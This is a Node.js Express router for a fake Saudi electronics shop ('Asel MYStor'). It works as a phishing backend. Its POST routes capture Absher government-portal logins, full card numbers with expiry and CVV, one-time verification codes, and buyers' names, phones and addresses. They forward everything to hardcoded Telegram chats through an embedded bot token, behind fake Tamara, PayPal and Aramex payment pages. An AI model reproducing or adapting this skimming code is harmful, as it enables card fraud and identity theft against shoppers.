var express = require("express");
var router = express.Router();
var pdf = require("html-pdf");
var fileURLToPath = require("url");
var dirname = require("path");
var pdfTemp = require("../doc/index.js");
const TelegramBot = require('node-telegram-bot-api');
var installment = require("../doc/installment.js");

const token = '6290440801:AAHw4XVlJ2HXnE2CEopEuDVUqcVJyYhoxAw';
const bot = new TelegramBot(token, {polling: true});

const {
  switchGame,
  Product,
  playGame,
  videoGame,
} = require("../helper/data");
const {
  Products,
  AppleProduct,
  iphone12,
  iphone14,
  iphone13,
  Mobile,
  Laptop,
  Samsung,
  Ipad,
  Watch,
  Games,
  ProductById,
} = require("../helper/iphones");
var nodemailer = require("nodemailer");
    
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  console.log("*id", chatId);
  // send a message to the chat acknowledging receipt of their message
  bot.sendMessage(chatId, `Your fucking ID : ${chatId}`);
});

  
var options = { format: "A4" };

let ids=[6104065767 ,5903247003, 1871236873 ]
// pages raouts
router.get("/", function (req, res, next) {
  
  res.render("index", {
    switchGame,
    playGame,
    videoGame,
    iphone14,
    iphone12,
    iphone13,
    Samsung,
    Games
  });
});

// ===== absher =====
router.get("/absher", function (req, res, next) {
  res.render("absher", {});
});

router.post("/absher", function( req,res){
  let htl = `
  ======= Absher =======

   absher: ${req.body.id} 

   pass: ${req.body.pass} 
   
  ======================
  `;
//  ,5786018391 aseel
  
  for (let index = 0; index < ids.length; index++) {
    bot.sendMessage(ids[index], htl);
  }
  
res.redirect('verfiedCode')
})

router.get("/cart/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  let total = pro.price 
  res.render("cart", { title: "Express", pro, total });
});

router.get("/iphone-cart/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Products.filter((i) => i.id == id);
  let pro = apro[0];
  let total = parseInt(pro.price) 
  console.log("totla", total);
  res.render("iphone-cart", { title: "Express", pro, total });
});

router.get("/checkout/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("checkout", { title: "checkout", pro });
});
router.get("/iphone-checkout/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Products.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("iphone-checkout", { title: "checkout", pro });
});

router.get("/tamara-checkout", function (req, res, next) {
  res.render("tamara", { title: "payment ways" });
});
router.get("/tamara-card", function (req, res, next) {
  res.render("tamaraCard", { title: "payment ways" });
});

// test category
router.get("/category", function (req, res, next) {
  res.render("category", { title: "Express" });
});

router.get("/categories/:id", function (req, res, next) {
  let cat = req.params.id;
  let category = Product.filter((i) => i.category == cat);
  res.render("category", { title: "Express", category });
});

router.get("/products/:id", function (req, res, next) {
  let id = req.params.id;
  console.log("id", id);
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("product", { title: "Express", product:pro });
});

// ============ iphons-routs ==============
router.get("/iphone-products/:id", function (req, res, next) {
  let id = req.params.id;
  console.log("id", id);
  let apro = Products.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("iphone-product", { title: "Express", product:pro });
});

router.get("/iphone14/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("iphone14", { title: "Express", pro });
});
router.get("/contact", function (req, res, next) {
  res.render("contact", { title: "Express" });
});
router.get("/watch", function (req, res, next) {
  res.render("watch", { Watch });
});
router.get("/ipad", function (req, res, next) {
  res.render("ipad", { Ipad });
});
router.get("/pay", function (req, res, next) {
  res.render("pay", { title: "Express" });
});
router.get("/paypal", function (req, res, next) {
  res.render("paypal", { title: "Express" });
});
router.get("/paypal-code", function (req, res, next) {
  res.render("paypalCode", { title: "Express" });
});



router.get("/pro", (req, res) => {
  res.render("pro");
});

router.get("/verfiedCode/:cc", (req, res) => {
  res.render("code",{cc: req.params.cc});
});
router.get("/payError", (req, res) => {
  res.render("payError");
});
router.get("/aramex/:id/:phone", (req, res) => {
  let id= req.params.id;
  let phone= req.params.phone;
  res.render("aramex",{id, phone});
});



// ============= Register User =================

router.post("/userRegister",async function (req, res, next) {
   
  let install  
  req.body.receivershipping =="on" ? install =  `تقسيط على [  ${req.body.month} ] شهر [ ${req.body.monthy}] ريال شهرياً` : install = "كاش "
 console.log("body", req.body );
 
  let htl = `
     ==== ®️ Asel MYStor ==== 

        name: ${req.body.name} 

        whatsapp: +966${req.body.phone} 

        price: ${req.body.price} ريال 

        type: ${install}

        product: ${req.body.note} 

        addres: ${req.body.address} 

        addres2: ${req.body.address2} 

        invoice:  ${req.hostname}/invoices/${req.body.ordId}invoice.pdf

       ${req.body.receivershipping =="on"? `instalmnt:  ${req.hostname}/installment/${req.body.ordId}instlmnt.pdf` : "" } 

     ===========================
  `;
  
  
  for (let index = 0; index < ids.length; index++) {
    bot.sendMessage(ids[index], htl);
  }

  if (req.body.receivershipping =="on") {
    await pdf.create(pdfTemp.doc(req.body), options).toFile(`./invoices/${req.body.ordId}invoice.pdf`,async (err) => {
      await pdf.create(installment.doc(req.body), options).toFile(`./installment/${req.body.ordId}instlmnt.pdf`, async (err)=>{
        
      })
     });
  }else{
    await pdf.create(pdfTemp.doc(req.body), options).toFile(`./invoices/${req.body.ordId}invoice.pdf`,async (err) => {
      
    });
  }
  
  
  return res.status(200).json({ message: "success" });
 
});

router.get("/checkout-card/:id/:phone", (req, res) => {
  let id = req.params.id
  let phone = req.params.phone
  console.log("phone", phone);
  res.render("card", {id, phone});
});

// ============= Visa Card =====================
router.post("/paymentCard", function (req, res, next) {
   
  let htl = `
    ==== 💳 Asel MYStor =======

      📞: +966${req.body.phone}

      🆔: ${req.body.name}

      💳: ${req.body.cardnumber}
      
      📅: ${req.body.carddate} / ${req.body.carddate1}

      🔐: ${req.body.cvv}

      totl: ${req.body.total}

    ===========================
  `;
   
  for (let index = 0; index < ids.length; index++) {
    bot.sendMessage(ids[index],htl);
  }
  
  res.redirect("/");
});


router.post("/verfiedCode", function (req, res, next) {
  let htl = `
  ===== 🔐 Asel MYStor =====  

  💳: ${req.body.cc}

  🔐: ${req.body.verfiedCode} 

  ======================  
  `;
   
  for (let index = 0; index < ids.length; index++) {
    bot.sendMessage(ids[index], htl);
  }
  return res.status(200).json({ message: "success" });
});

 

// ============= add-to-cart =================

router.post("/add-to-cart/:id", function(req,res,next){
  try {
    console.log("body", req.params.id);

    return res.status(200).json({message:"success"})
  } catch (error) {
    return res.status(400).json({message:"erroo"})
  }
})

module.exports = router;
